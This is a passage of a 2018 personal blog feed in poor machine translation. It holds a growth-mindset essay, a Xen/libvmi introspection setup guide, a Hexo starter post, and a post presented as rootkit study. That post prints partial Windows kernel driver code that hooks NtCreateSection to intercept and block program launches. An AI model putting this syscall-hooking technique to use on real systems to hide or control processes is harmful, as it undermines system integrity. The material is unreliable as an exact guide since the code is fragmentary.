class="keyword">in</span> fatalism.</span><br><span class="line"></span><br><span class="line"><span class="string">"You are not going to go to college with this kind of IQ."</span> <span class="string">"I'll take a few more times."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"How can your family be so poor and how can you start?"</span> <span class="string">"Money I can earn."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"You can not catch the girl."</span> <span class="string">"The first chase."</span></span><br><span class="line"></span><br><span class="line">Compared with the results, more concerned about the process;</span><br><span class="line"></span><br><span class="line">Compared with the failure, more concerned about the accumulated experience;</span><br><span class="line"></span><br><span class="line">This is the growth of thinking, <span class="keyword">do</span> not believe that <span class="string">"people's life, day is doomed"</span>, but always keep the development, keep making progress.</span><br></pre></td></tr></table></figure><h3 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Son of mathematics <span class="built_in">test</span> 59 points, he stood <span class="keyword">in</span> front of his father, head down, tightly holding the papers.</span><br><span class="line"></span><br><span class="line">Dad can say: <span class="string">"how can you even pass the exam can not, this life do not want to learn math!"</span></span><br><span class="line"></span><br><span class="line">Dad can also say: <span class="string">"wow, poor will be able to pass, the future immeasurable ah boy!"</span></span><br><span class="line"></span><br><span class="line">The first sentence, <span class="keyword">in</span> addition to his father vent their emotions, the child is not a little benefit.</span><br><span class="line"></span><br><span class="line">The child will only become increasingly skeptical of himself: I may not really learn the material</span><br><span class="line"></span><br><span class="line">The second sentence is to <span class="built_in">let</span> the children understand that he has been very close to the passing, the next time as long as more effort can become better.</span><br><span class="line"></span><br><span class="line">Consciously cultivating children<span class="string">'s growth thinking is extremely important, which allows them to more positive face of failure, rather than touch</span></span><br></pre></td></tr></table></figure><h3 id="Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking"><a href="#Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking" class="headerlink" title="Fourth:Change the way you speak, that is, change your way of thinking."></a>Fourth:Change the way you speak, that is, change your way of thinking.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1\. <span class="string">"I do not understand what?"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"I made a mistake."</span> Become <span class="string">"this mistake made me learn something."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"It's too hard."</span> Become <span class="string">"I may need more effort."</span></span><br><span class="line"></span><br><span class="line">4\. <span class="string">"Is it really my best thing?"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"I can only do that."</span> <span class="string">"I can try again."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"I can never be as clever as he is."</span> Become <span class="string">"I should learn from him."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"I'm not too good at this."</span> Become <span class="string">"I'm improving."</span></span><br><span class="line"></span><br><span class="line"><span class="string">"I gave up."</span> <span class="string">"I'd better try other ways."</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Fifth；Only in the case of despair, we will choose to give up</span></span><br><span class="line"></span><br><span class="line">People who have fixed thinking are more likely to have despair <span class="keyword">in</span> their failure, so they are more likely to choose to give up.</span><br><span class="line"></span><br><span class="line">People who have grown mind think of life as a continuous process, every failure as a stepping stone, will not give up, so they are more likely to be successful.</span><br><span class="line"></span><br><span class="line">Know there is a question and answer is very exciting,</span><br><span class="line"></span><br><span class="line">Asked, <span class="string">"how to get out of the haze of life?"</span></span><br><span class="line"></span><br><span class="line">Answer, <span class="string">"take a few more steps."</span></span><br><span class="line"></span><br><span class="line">More info: [crazy reading](http://mp.weixin.qq.com/s?__biz=MjM5Mzk0OTI2MA==&amp;mid=2650571632&amp;idx=1&amp;sn=53ea9cae463779b63d8241248778450b&amp;chksm=be87105389f0994599d4a697a33a4c2d8f5de460357bf793a18fa8f1a60bc8dab65dc7100e30&amp;mpshare=1&amp;scene=23&amp;srcid=0919NB7BbDvelTwRARwTFShx<span class="comment">#rd)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Angela Lee is a math teacher in a public school in the United States, she found a strange phenomenon -&lt;/p&gt;
&lt;p&gt;IQ high student achievement
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pocess</title>
    <link href="http://yoursite.com/2018/11/22/2/"/>
    <id>http://yoursite.com/2018/11/22/2/</id>
    <published>2018-11-22T10:36:36.030Z</published>
    <updated>2018-11-22T10:22:37.887Z</updated>
    
    <content type="html"><![CDATA[<p>What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function is<br>In the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and wood<br>Horse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letter<br>The purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,<br>So that our system more robust, give full play to the positive application of this technology.  </p><h1 id="Process-monitoring"><a href="#Process-monitoring" class="headerlink" title="Process monitoring"></a>Process monitoring</h1><hr><h3 id="Create-a-new-drive"><a href="#Create-a-new-drive" class="headerlink" title="Create a new drive"></a>Create a new drive</h3><pre><code class="bash">ULONG __stdcall check(PULONG arg)//获得指向服务参数指针{  HANDLE hand=0;PFILE_OBJECT file=0;  POBJECT\_HANDLE\_INFORMATION info=0;ULONG a;char*buff;  ANSI\_STRING str; LARGE\_INTEGER li;li.QuadPart=-10000;<span class="keyword">if</span>((arg\[4\]&amp;0xf0)==0)<span class="built_in">return</span> 1;//检测标志<span class="keyword">if</span>((arg\[5\]&amp;0x01000000)==0)<span class="built_in">return</span> 1;//检测属性//通过文件句柄获得文件名hand=(HANDLE)arg\[6\];//获得执行文件句柄ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;file,info);//&amp;file获得对象体指针<span class="keyword">if</span>(!file)<span class="built_in">return</span> 1;RtlUnicodeStringToAnsiString(&amp;str,&amp;file-&gt;FileName,1);a=str.Length;buff=str.Buffer;<span class="keyword">while</span>(1)//通过循环判断是不是有<span class="string">". "</span>标志{<span class="keyword">if</span>(buff\[a\]==<span class="string">'.'</span>){a++;<span class="built_in">break</span>;}  a--;}ObDereferenceObject(file);<span class="keyword">if</span>(_stricmp(&amp;buff\[a\],<span class="string">"exe"</span>)){RtlFreeAnsiString(&amp;str);<span class="built_in">return</span> 1;}//判断是否为可执行文件KeWaitForSingleObject(&amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态strcpy(&amp;output\[8\],buff);//将string复制进buffRtlFreeAnsiString(&amp;str);a=1;//用户的决定通过a的制来反映memmove(&amp;output\[0\],&amp;a,4);<span class="keyword">while</span>(1){KeDelayExecutionThread(KernelMode,0,&amp;li);//在一个固定时间间隔内当前线程处于等待状态memmove(&amp;a,&amp;output\[0\],4);<span class="keyword">if</span>(!a)<span class="built_in">break</span>;}memmove(&amp;a,&amp;output\[4\],4);KeSetEvent(&amp;event,0,0);<span class="built_in">return</span> a;}//保存执行文件上下文，调用check()函数_declspec(naked) Proxy(){_asm{pushfdpushadmov ebx,espadd ebx,40push ebxcall checkcmp eax,1//由check()的返回值判断是否让可执行文件继续执行jne blockpopadpopfdjmp RealCallee//通过，调用ntcreatesectionblock:popadmov ebx, dword ptr\[esp+8\]mov dword ptr\[ebx\],0mov eax,0xC0000022L//不让其通过，返回STATUS\_ACCESS\_DENIEDpopfdret 32}}到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。 char\*name=(char\*)&amp;outputbuff\[8\];        <span class="keyword">for</span>(x=0;x&lt;stringcount;x++)        {            <span class="keyword">if</span>(!stricmp(name,strings\[x\])){a=1;goto skip;}        }        strcpy(msgbuff, <span class="string">"Do you want to run "</span>);        strcat(msgbuff,&amp;outputbuff\[8\]);        <span class="keyword">if</span>(IDYES==MessageBox(0, msgbuff,<span class="string">"WARNING"</span>,           MB\_YESNO|MB\_ICONQUESTION|0x00200000L))        {a=1; strings\[stringcount\]=_strdup(name);stringcount++;}        <span class="keyword">else</span> a=0;        // write response to the buffer, and driver will get it        skip:memmove(&amp;outputbuff\[4\],&amp;a,4);        //让驱动继续        a=0;        memmove(&amp;outputbuff\[0\],&amp;a,4);}}</code></pre><p>More info: <a href="https://baike.baidu.com/item/rootkit/6356777?fr=aladdin" target="_blank" rel="noopener">Rootkit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Virtualization monitoring process</title>
    <link href="http://yoursite.com/2018/11/22/1/"/>
    <id>http://yoursite.com/2018/11/22/1/</id>
    <published>2018-11-22T09:48:08.186Z</published>
    <updated>2018-11-22T09:47:43.169Z</updated>
    
    <content type="html"><![CDATA[<p>With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit.  </p><hr><h3 id="install-xen-on-the-ubuntu"><a href="#install-xen-on-the-ubuntu" class="headerlink" title="install xen on the ubuntu"></a>install xen on the ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install virt-manager</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install xen-hypervisor-amd64</span><br><span class="line"></span><br><span class="line">$ sudo reboot</span><br><span class="line"></span><br><span class="line">$ sudo xl list(Check <span class="keyword">if</span> the installation is successful)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">Site of docu: [Xen](https://xenserver.org/)</span><br><span class="line"></span><br><span class="line"><span class="comment">### The virtual machine is created to run</span></span><br><span class="line">```bash</span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get -y install virt-manager qemu-system</span><br><span class="line"></span><br><span class="line">$ There is no need <span class="keyword">for</span> instructions here, as to download ubuntu system</span><br><span class="line"></span><br><span class="line">Attention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as follows</span><br><span class="line"></span><br><span class="line">Click on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, </span><br><span class="line"></span><br><span class="line">I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)</span><br><span class="line"></span><br><span class="line">The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The The</span><br><span class="line"></span><br><span class="line">installation. The The The The The The The The</span><br><span class="line"></span><br><span class="line">And <span class="keyword">then</span> <span class="built_in">type</span> the <span class="built_in">command</span> line $ sudo xl list on dom0, you can see xen monitor the two systems:</span><br></pre></td></tr></table></figure><p>More info: <a href="http://www.ubuntu.org.cn/index_kylin" target="_blank" rel="noopener">Ubuntu</a></p><h3 id="libvmi-variant-installation"><a href="#libvmi-variant-installation" class="headerlink" title="libvmi variant installation"></a>libvmi variant installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1 sudo apt-get install libglib2.0-dev</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line"></span><br><span class="line">If Error: could not find libtoolize or glibtoolize</span><br><span class="line"></span><br><span class="line">Solve: sudo apt-get install libtool</span><br><span class="line"></span><br><span class="line">2 ./autogen.sh</span><br><span class="line"></span><br><span class="line">  ./configure</span><br><span class="line"></span><br><span class="line">If missing xenstore</span><br><span class="line"></span><br><span class="line">Solve:sudo apt-get install libxen-dev... ...</span><br><span class="line"></span><br><span class="line">you just need to install whats the packge you need!</span><br><span class="line"></span><br><span class="line">sudo apt-get install check</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line">Last:View the files under libvmi-0.10.1 / example</span><br><span class="line"></span><br><span class="line">If you can find process-list、process-list.c、process-list.o,<span class="keyword">then</span> congratulation to you <span class="keyword">for</span> that you are successful!</span><br><span class="line"></span><br><span class="line">More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve <span class="keyword">for</span> everyone!</span><br></pre></td></tr></table></figure><p>More info: <a href="http://libvmi.com/" target="_blank" rel="noopener">libvmi</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Formula: * p = p-pid;</span><br><span class="line"></span><br><span class="line">More info: According to the various versions of the operating system data structure Xie wrote the main <span class="keyword">function</span> of the module and Makfile file  </span><br><span class="line">Formula: * p = p-pid;  </span><br><span class="line">Also perform a file to view the kernel data structure of the various defined macros as well as the operation</span><br></pre></td></tr></table></figure><p>More info: <a href="http://blog.csdn.net/geekcome/article/details/6196044" target="_blank" rel="noopener">CSDN</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the beh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/11/21/hello-world/"/>
    <id>http://yoursite.com/2018/11/21/hello-world/</id>
    <published>2018-11-21T09:25:53.060Z</published>
    <updated>2018-11-21T09:25:53.060Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
